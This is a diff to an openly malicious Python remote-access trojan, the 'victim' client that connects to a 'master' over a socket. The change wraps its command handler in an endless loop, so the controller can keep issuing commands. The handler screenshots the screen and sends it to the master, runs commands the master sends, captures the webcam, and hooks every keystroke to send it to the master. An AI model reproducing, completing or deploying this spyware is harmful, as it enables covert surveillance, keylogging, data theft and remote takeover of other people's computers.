@@ -2,7 +2,6 @@ import socket
 from  PIL import ImageGrab
 import os
 import cv2
-from pynput import keyboard
 import keyboard
 
 #consts
@@ -60,29 +59,29 @@ def main():
             victim_socket.send("NO".encode(HASH))
             print("VICTIM: NO")
             return
-        
-        #recive the command from the msater
-        remote_command = victim_socket.recv(BUFFER_SIZE).decode(HASH)
-        #take a screenshot, save it as a file and send it to the master
-        if remote_command == "screenshot":
-            take_screenshot("test.png", victim_socket)
-            print("screenshot was taken...")
-        #run the command that the master sent in the current cmd and sent a screenshot of the command results
-        elif remote_command == "cmd":
-            print("master using cmd...")
-            victim_socket.send("victim's cmd is ready to get the command...".encode(HASH))
-            cmd_control(victim_socket.recv(BUFFER_SIZE).decode(HASH))
-            take_screenshot("cmd.png",victim_socket)
-        #active the victim's webcam and take a screenshot before the webcam closed
-        elif remote_command == "webcam":
-            get_webcam()
-            take_screenshot("webcam.png",victim_socket)
-        #send to the master's console every key that is pressed
-        elif remote_command == "keylis":
-            # register the callback for all key events
-            keyboard.hook(callback=lambda event: key_press_event(event,victim_socket))
-            # keep the program running
-            keyboard.wait('esc')
+        while True:
+            #recive the command from the msater
+            remote_command = victim_socket.recv(BUFFER_SIZE).decode(HASH)
+            #take a screenshot, save it as a file and send it to the master
+            if remote_command == "screenshot":
+                take_screenshot("screenshot.png", victim_socket)
+                print("screenshot was taken...")
+            #run the command that the master sent in the current cmd and sent a screenshot of the command results
+            elif remote_command == "cmd":
+                print("master using cmd...")
+                victim_socket.send("victim's cmd is ready to get the command...".encode(HASH))
+                cmd_control(victim_socket.recv(BUFFER_SIZE).decode(HASH))
+                take_screenshot("cmd.png",victim_socket)
+            #active the victim's webcam and take a screenshot before the webcam closed
+            elif remote_command == "webcam":
+                get_webcam()
+                take_screenshot("webcam.png",victim_socket)
+            #send to the master's console every key that is pressed
+            elif remote_command == "keylis":
+                # register the callback for all key events
+                keyboard.hook(callback=lambda event: key_press_event(event,victim_socket))
+                # keep the program running
+                keyboard.wait('esc')
             
 if __name__ == '__main__':
     main()
